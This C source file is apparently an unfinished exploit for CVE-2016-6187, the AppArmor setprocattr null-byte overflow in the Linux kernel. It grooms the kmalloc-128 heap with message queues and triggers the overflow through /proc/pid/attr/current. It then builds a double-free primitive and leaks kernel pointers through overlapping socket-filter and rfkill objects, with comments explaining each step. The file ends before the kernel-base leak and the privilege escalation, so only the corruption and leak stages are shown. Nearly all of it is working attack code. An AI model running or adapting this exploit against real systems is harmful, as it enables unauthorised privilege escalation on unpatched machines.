#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <inttypes.h>
#include <stdbool.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <keyutils.h>

#define KERNEL_BASE_NOKASLR 0xffffffff80000000

#define N_PAGES    (7)
#define N_MESSAGES ((N_PAGES * 4096) / 0x80)

#define MTYPE_DEFAULT 0xdeadbeef

#define aslr_addr(offs) (kernel_base + (offs))

typedef enum {

    STATUS_SUCCESS,
    STATUS_FAILURE

} status_t;

typedef struct msg_buffer {

    long mtype;
    char mtext[0x40];

} msg_buffer_t;

static inline void id(void) {

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
}

static bool message_exists(const int msqid, const long mtype, const int flg) {

    /* 
     * A trick to probe for messages based on their mtype
     * without altering the queue.
     * */

    msg_buffer_t msgbuf = { 0 };

    errno = 0;
    int d = msgrcv(msqid, &msgbuf, 1, mtype, IPC_NOWAIT | flg);

    if (errno == E2BIG)
        return true;

    if (errno == ENOMSG)
        return false;

    printf("%s: unexpected result!\n", __func__);
    return true;
}

static void message_add(const int msqid, const char* text, const long mtype) {

    msg_buffer_t msgbuf = { 0 };

    msgbuf.mtype = mtype;
    strncpy(msgbuf.mtext, text, sizeof(msgbuf.mtext));

    if (msgsnd(msqid, &msgbuf, sizeof(msgbuf.mtext), IPC_NOWAIT) < 0)
        printf("Could not add message (%d, %s, 0x%lx)\n", msqid, text, mtype);
}

static void message_del(const int msqid, const long mtype, msg_buffer_t* msgbuf) {

    msg_buffer_t* msgp         = msgbuf;
    msg_buffer_t  msgbuf_local = { 0 };

    if (msgbuf == NULL)
        msgp = &msgbuf_local;

    if (msgrcv(msqid, msgp, sizeof(msgp->mtext), mtype, IPC_NOWAIT) < 0)
        printf("Could not delete message (%d, 0x%lx)\n", msqid, mtype);
}

static void message_peek(const int msqid, const long index, msg_buffer_t* msgbuf) {

    if (msgrcv(msqid, msgbuf, sizeof(msgbuf->mtext), index, IPC_NOWAIT | MSG_COPY) < 0)
        printf("Could not peek message (%d, 0x%lx) (errno: %s)\n", msqid, index, strerror(errno));
}

int main(void) {

    cpu_set_t            cpu_set;
    char                 proc_attr_curr[64];
    unsigned int         attr_current_fd;
    int                  msqid;
    msg_buffer_t         msgbuf = { 0 };
    uint32_t             free_tag_counter = 0;
    char                 wbuf[0x80];
    int                  sock;
    struct ipv6_mreq     mc_group;
    uint8_t              gsf_block[GROUP_FILTER_SIZE(6)];
    socklen_t            optlen = sizeof(gsf_block);
    struct group_filter* gsf;
    struct sockaddr_in6* sin6ptr;
    unsigned int         rfkill_fd;
    uintptr_t            kptr_kmalloc128, kptr_rfkill_fds;
    status_t             exploit_status;

    id();

    printf("Hmmm...Boring unprivileged shell :(\n");
    printf("Let's try to change that!\n");

    /*
     * Pin exploit to CPU 0 since we are about
     * to rely on per-CPU freelists.
     * */

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);

    sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);

    /*
     * prepare a socket and join a multicast group. We will
     * use the group filter later to leak some kernel pointers.
     * */

    if ((sock = socket(AF_INET6, SOCK_DGRAM, 0)) < 0) {

        printf("Could not open socket: %s\n", strerror(errno));
        return STATUS_FAILURE;
    }

    mc_group.ipv6mr_interface = 2;
    inet_pton(AF_INET6, "ffff::9", &mc_group.ipv6mr_multiaddr);

    if (setsockopt(sock, IPPROTO_IPV6, IPV6_JOIN_GROUP, &mc_group, sizeof(mc_group)) != 0) {

        printf("Could not join mcast group: %s\n", strerror(errno));

        close(sock);
        return STATUS_FAILURE;
    }

    /*
     * prepare a group filter with 6 source entries for later...
     * */

    gsf = (struct group_filter*) &gsf_block[0];

    gsf->gf_interface         = 2;
    gsf->gf_numsrc            = 6;
    gsf->gf_fmode             = MCAST_EXCLUDE;

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_group;
    sin6ptr->sin6_family = AF_INET6;

    inet_pton(PF_INET6, "ffff::9", &sin6ptr->sin6_addr);

    /*
     * prepare everything needed in order to trigger CVE-2016-6187
     * */

    sprintf(proc_attr_curr, "/proc/%d/attr/current", getpid());
    printf("Opening %s...\n", proc_attr_curr);

    if ((attr_current_fd = open(proc_attr_curr, O_RDWR)) < 0) {

        printf("Could not open: %s\n", proc_attr_curr);
        return STATUS_FAILURE;
    }

    /*
     * open a new message queue. We will use this to groom
     * the heap and increase overall exploit reliability.
     * */

    msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    printf("Opened new message queue. MSQID=%d\n", msqid);

    /*
     * groom the heap by spamming the kernel with a bunch of messages
     * */

    printf("Spamming the kernel with annoying messages...\n");

    for (int i = 0; i < N_MESSAGES; i++)
        message_add(msqid, "A", MTYPE_DEFAULT);

    /*
     * now that we have groomed our heap, let's setup the
     * exploit section
     * */

    printf("Setting up exploit section...\n");

    message_add(msqid, "GUARD",       MTYPE_DEFAULT);
    message_add(msqid, "TO_BE_FREED", 1);
    message_add(msqid, "TO_BE_FREED", 2);
    message_add(msqid, "DF",          3);
    message_add(msqid, "TO_BE_FREED", 4);
    message_add(msqid, "GUARD",       MTYPE_DEFAULT);

    /*
     * free'ing all messages that were tagged with a free tag.
     *
     * Following part is critical. We try to perform the heap operations as
     * atomic as possible and avoid unnecessary syscalls.
     * */

    printf("Requesting messages that were marked as to be free'd...\n");
    printf("Pssst...Going silent during critical section...\n");

    memset(wbuf, 'A', 0x80 * sizeof(char));

    message_del(msqid, 4, NULL);
    message_del(msqid, 2, NULL);
    message_del(msqid, 1, NULL);

    /*
     * now quickly allocate the vulnerable buffer and
     * trigger the nullbyte overflow in apparmor_setprocattr!
     *
     * Remember, that the vulnerable buffer will be free'd
     * again once we return from the write syscall.
     * */
    write(attr_current_fd, wbuf, 0x80);

    /*
     * with a bit luck, the previous nullbyte overflow has
     * overwritten the LSB of the freelist next pointer of message #2,
     * so that it now points to the still alloc'd message #3
     *
     * We can then regularly free message #3 in order to escalate
     * to a double-free primitive.
     *
     * The resulting situation is similar to the fastbin dup attack
     * against glibc's ptmalloc-2 allocator.
     *
     * 1 -> 2 -> 4       // non corrupted freelist
     * 1 -> 2 -> 3       // freelist after nullbyte overflow
     * 3 -> 1 -> 2 -> 3  // freelist after free'ing message #3
     *
     * This allows us to allocate two overlapping structures within the
     * kmalloc-128 cache.
     * */

    /*
     * double free message #3 
     * */
    message_del(msqid, 3, NULL);

    /*
     * and now allocate a structure that lets us copy back its content
     * to userspace.
     *
     * ip6_sf_socklist is the perfect fit for our needs. It is an elastic object
     * and can be alloc'd via setsockopt using the MCAST_MSFILTER option on the
     * IPPROTO_IPV6 level. Its content can be read back via getsockopt.
     * */

    if (setsockopt(sock, IPPROTO_IPV6, MCAST_MSFILTER, gsf, optlen) != 0)
        printf("setsockopt: %s\n", strerror(errno));

    /*
     * pop message #1 from the freelist
     * */
    message_add(msqid, "A", 1);

    /*
     * pop message #2 from the freelist
     * */
    message_add(msqid, "A", 2);

    /*
     * The following rfkill_data object will overlap our previously
     * allocated ip6_sf_socklist object, which we will use to leak some
     * rfkill_data pointers back into userspace.
     * */

    if ((rfkill_fd = open("/dev/rfkill", O_RDWR)) < 0)
        printf("Could not open /dev/rfkill\n");

    /*
     * leaking rfkill_data.list.prev and rfkill_data.events.prev...
     *
     * TODO: maybe check exploit status here and if needed,
     * restart the exploit. If the leak does not appear to be a valid
     * kernelspace address, we can safely assume, that the target LSB
     * was already zero.
     * */
    printf("Leaking kernel pointers...\n");

    if (getsockopt(sock, IPPROTO_IPV6, MCAST_MSFILTER, gsf, &optlen) != 0)
        printf("getsockopt: %s\n", strerror(errno));

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_slist[0];
    kptr_rfkill_fds = *((uintptr_t*) &sin6ptr->sin6_addr);

    sin6ptr = (struct sockaddr_in6*) &gsf->gf_slist[1];
    kptr_kmalloc128 = *((uintptr_t*) &sin6ptr->sin6_addr) - 0x10;

    printf("rfkill_data object (kmalloc-128): %p\n", kptr_kmalloc128);
    printf("rfkill_fds list head: %p\n", kptr_rfkill_fds);

    /*
     * leaking kernel text base
     * */

    return STATUS_SUCCESS;
}
